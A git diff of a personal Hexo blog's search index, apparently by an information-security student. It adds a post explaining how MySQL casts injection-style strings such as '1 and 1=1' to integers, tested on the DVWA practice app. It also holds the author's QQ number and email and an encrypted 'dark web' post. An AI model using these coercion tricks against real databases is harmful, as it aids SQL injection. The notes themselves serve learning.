@@ -2,7 +2,7 @@
 <search>
   <entry>
     <title>docker 常用命令</title>
-    <url>/2020/07/10/%E5%B7%A5%E5%85%B7/docker/</url>
+    <url>/2020/07/20/%E5%B7%A5%E5%85%B7/docker/</url>
     <content><![CDATA[<h1>docker</h1>
 <p>显示所有容器</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker container ls --all</span><br></pre></td></tr></table></figure>
@@ -22,7 +22,7 @@
   <entry>
     <title>dark web</title>
     <url>/2020/07/21/%E6%9D%82%E8%AE%B0/dark_web/</url>
-    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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 </div>]]></content>
+    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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 </div>]]></content>
       <categories>
         <category>杂记</category>
       </categories>
@@ -55,6 +55,60 @@
       </categories>
       <tags>
         <tag>Markdown</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>At the very beginning...</title>
+    <url>/2020/04/06/%E6%9D%82%E8%AE%B0/Beginning/</url>
+    <content><![CDATA[<p><img src="/2020/04/06/%E6%9D%82%E8%AE%B0/Beginning/h2USniLgmurJKMe.png" alt></p>
+<h2 id="为什么写博客"><a class="header-anchor" href="#为什么写博客"></a>为什么写博客</h2>
+<p>0.作为一只程序猿，有自己的博客听起来更屌一点。</p>
+<p>1.记录和分享一些学到的东西。</p>
+<p>2.倒逼自己去学一些新东西。</p>
+<p>搭这个博客用的是Github Page + Hexo框架+Ayer主题。有一说一，<strong>hexo</strong> 用起来是真的方便，简单又实用，并且因为它是一个开源框架，所以在github可以找到各式各样的hexo主题，多花点时间总能找到自己喜欢的那一款。虽然陆陆续续研究了一两天也只是弄了个大概，一些功能还没完善，但看起来还是比CSDN好看多了不是？😬</p>
+<h2 id="关于我"><a class="header-anchor" href="#关于我"></a>关于我</h2>
+<p>中南大学信息安全专业18级菜鸡一只</p>
+<p>学习方向：后端开发，渗透测试</p>
+<p>喜欢健身，徒步，游戏</p>
+<p>qq：1755936129</p>
+<p>邮箱：1755936129@qq.com</p>
+<p>欢迎交流 ~</p>
+]]></content>
+      <categories>
+        <category>杂记</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>mysql</title>
+    <url>/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/</url>
+    <content><![CDATA[<h2 id="查询"><a class="header-anchor" href="#查询"></a>查询</h2>
+<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722082629984.png" alt="image-20200722082629984"></p>
+<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722084058433.png" alt="image-20200722084058433"></p>
+<p><code>DVWA</code>的<code>user</code>表👆</p>
+<p>在进行如下查询时：</p>
+<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722082807883.png" alt="image-20200722082807883"></p>
+<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722082829117.png" alt="image-20200722082829117"></p>
+<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722084904218.png" alt="image-20200722084904218"></p>
+<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722084727031.png" alt="image-20200722084727031"></p>
+<p><img src="/2020/07/22/%E5%B7%A5%E5%85%B7/mysql/image-20200722083932481.png" alt="image-20200722083932481"></p>
+<p>通过上面几个例子可以看到，mysql查询语句的条件判断中，像user_id = ‘xxx’ 这种条件，user_id 是整型，而 ‘xxx’ 是字符串型，在判断时，'xxx’会被当作一个整型与 user_id进行比较。</p>
+<p>而转换的规则也很有意思。</p>
+<p>‘1 and 1=1’ 被当作 1</p>
+<p>‘1 and 1=2’ 也被当作1</p>
+<p>‘2 and 1=1’ 被当作2</p>
+<p>经过更多的测试可以发现</p>
+<p>这个字符串（不论是单引号或者是双引号）在被当作整型数进行处理的时候</p>
+<p>如果第一个字符不是数字，那么该字符串被当成<code>0</code>来处理；</p>
+<p>如果第一个字符是数字，那么这个字符串就等于从第一个字符开始的数字串</p>
+<p>比如：‘4gsb’ = 4；‘108hh’ = 108</p>
+]]></content>
+      <categories>
+        <category>工具</category>
+        <category>mysql</category>
+      </categories>
+      <tags>
+        <tag>mysql</tag>
+        <tag>sql</tag>
       </tags>
   </entry>
   <entry>
@@ -148,27 +202,6 @@
         <tag>linux</tag>
         <tag>环境配置</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>At the very beginning...</title>
-    <url>/2020/04/06/%E6%9D%82%E8%AE%B0/Beginning/</url>
